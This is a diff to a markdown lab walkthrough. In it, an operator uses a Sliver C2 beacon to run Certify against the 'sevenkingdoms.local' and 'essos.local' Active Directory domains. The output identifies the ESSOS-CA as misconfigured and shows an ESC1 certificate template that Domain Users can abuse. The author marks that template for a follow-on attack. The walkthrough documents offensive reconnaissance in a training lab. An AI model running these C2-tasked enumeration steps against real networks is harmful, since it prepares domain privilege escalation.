@@ -473,7 +473,7 @@ sliver (OTHER_WITCH) > tasks
 
 ```
 
-Now our Beacon is up and running lets run some nmap scans in the networks and look for some vulnerable AD CS Templates. 
+Now our Beacon is up and running lets look for some vulnerable AD CS Templates. 
 
 First check certify is installed
 
@@ -487,6 +487,142 @@ Now task our Beacon with looking for vulnerable templates. As there are 2 Domain
 
 
 ```bash
+sliver (OTHER_WITCH) > certify find /vulnerable /domain:sevenkingdoms.local
+
+[*] Tasked beacon OTHER_WITCH (e251386c)
+
+[+] OTHER_WITCH completed task e251386c
+
+[*] certify output:
+
+   _____          _   _  __              
+  / ____|        | | (_)/ _|             
+ | |     ___ _ __| |_ _| |_ _   _        
+ | |    / _ \ '__| __| |  _| | | |      
+ | |___|  __/ |  | |_| | | | |_| |       
+  \_____\___|_|   \__|_|_|  \__, |   
+                             __/ |       
+                            |___./        
+  v1.1.0                               
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=sevenkingdoms,DC=local'
+
+[*] Listing info about the Enterprise CA 'SEVENKINGDOMS-CA'
+
+    Enterprise CA Name            : SEVENKINGDOMS-CA
+    DNS Hostname                  : kingslanding.sevenkingdoms.local
+    FullName                      : kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=SEVENKINGDOMS-CA, DC=sevenkingdoms, DC=local
+    Cert Thumbprint               : C905E6849940A008D2521C895E5FE6DC86C76D2C
+    Cert Serial                   : 17A3937EFC3C5F9A40DE3AE3FB0B5C01
+    Cert Start Date               : 11/14/2023 8:25:05 PM
+    Cert End Date                 : 11/14/2028 8:35:05 PM
+    Cert Chain                    : CN=SEVENKINGDOMS-CA,DC=sevenkingdoms,DC=local
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Domain Admins   S-1-5-21-1377930917-3115711298-3089174014-512
+      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Enterprise AdminsS-1-5-21-1377930917-3115711298-3089174014-519
+    Enrollment Agent Restrictions : None
+
+[+] No Vulnerable Certificates Templates found!
+```
+
+Now on essos.local
+
+```bash
+sliver (OTHER_WITCH) > certify find /vulnerable /domain:essos.local
+
+[*] Tasked beacon OTHER_WITCH (3b45957a)
+
+[+] OTHER_WITCH completed task 3b45957a
+
+[*] certify output:
+
+   _____          _   _  __              
+  / ____|        | | (_)/ _|             
+ | |     ___ _ __| |_ _| |_ _   _        
+ | |    / _ \ '__| __| |  _| | | |      
+ | |___|  __/ |  | |_| | | | |_| |       
+  \_____\___|_|   \__|_|_|  \__, |   
+                             __/ |       
+                            |___./        
+  v1.1.0                               
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=essos,DC=local'
+
+[*] Listing info about the Enterprise CA 'ESSOS-CA'
+
+    Enterprise CA Name            : ESSOS-CA
+    DNS Hostname                  : braavos.essos.local
+    FullName                      : braavos.essos.local\ESSOS-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
+    Cert Thumbprint               : 78C4CB5A64C20061E88EE899266D085B27239156
+    Cert Serial                   : 272F12DA752A4D9D4A6B66379B961C7A
+    Cert Start Date               : 11/14/2023 8:25:08 PM
+    Cert End Date                 : 11/14/2028 8:35:07 PM
+    Cert Chain                    : CN=ESSOS-CA,DC=essos,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+      Allow  ManageCA, ManageCertificates               ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : braavos.essos.local\ESSOS-CA
+    Template Name                         : ESC1
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication
+    mspki-certificate-application-policy  : Client Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : ESSOS\Domain Users            S-1-5-21-3804392505-3025572388-606528806-513
+        All Extended Rights         : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+                                      NT AUTHORITY\SYSTEM           S-1-5-18
+      Object Control Permissions
+        Owner                       : ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+        Full Control Principals     : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+                                      NT AUTHORITY\SYSTEM           S-1-5-18
+        WriteOwner Principals       : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+                                      NT AUTHORITY\SYSTEM           S-1-5-18
+        WriteDacl Principals        : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+                                      NT AUTHORITY\SYSTEM           S-1-5-18
+        WriteProperty Principals    : ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Domain Admins           S-1-5-21-3804392505-3025572388-606528806-512
+                                      ESSOS\Enterprise Admins       S-1-5-21-3804392505-3025572388-606528806-519
+                                      NT AUTHORITY\SYSTEM           S-1-5-18
+```
+
+There are a few more vunerable Certificate Templates but for this one we will be focussing on ESC1 - https://posts.specterops.io/certified-pre-owned-d95910965cd2
+
 
 
 
